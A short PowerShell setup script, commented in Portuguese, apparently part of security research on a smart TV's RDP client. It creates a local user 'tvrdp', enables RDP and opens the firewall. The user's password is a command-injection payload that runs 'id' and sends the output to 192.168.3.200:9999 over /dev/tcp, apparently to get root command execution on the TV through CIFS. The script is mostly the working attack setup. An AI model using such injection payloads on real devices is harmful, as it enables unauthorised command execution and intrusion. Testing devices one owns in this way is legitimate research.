# setup-rdp.ps1 — RODAR COMO ADMINISTRADOR
# Cria usuario local "tvrdp" cuja senha e o payload de teste do CIFS-root,
# habilita RDP e o firewall. Reverter com cleanup-rdp.ps1 depois do teste.

$ErrorActionPreference = 'Stop'

$pwd = '$(id>/dev/tcp/192.168.3.200/9999)'
$sec = ConvertTo-SecureString $pwd -AsPlainText -Force

if (Get-LocalUser -Name 'tvrdp' -ErrorAction SilentlyContinue) {
    Set-LocalUser -Name 'tvrdp' -Password $sec
    Write-Host 'usuario tvrdp atualizado'
} else {
    New-LocalUser -Name 'tvrdp' -Password $sec -PasswordNeverExpires -AccountNeverExpires | Out-Null
    Write-Host 'usuario tvrdp criado'
}

Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'tvrdp' -ErrorAction SilentlyContinue
Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'

Write-Host 'RDP habilitado. Teste local:'
Test-NetConnection -ComputerName 127.0.0.1 -Port 3389 -WarningAction SilentlyContinue | Select-Object TcpTestSucceeded
Write-Host 'Pronto. Na TV: PC on TV > RDP > 192.168.3.200, usuario tvrdp, senha = o payload.'
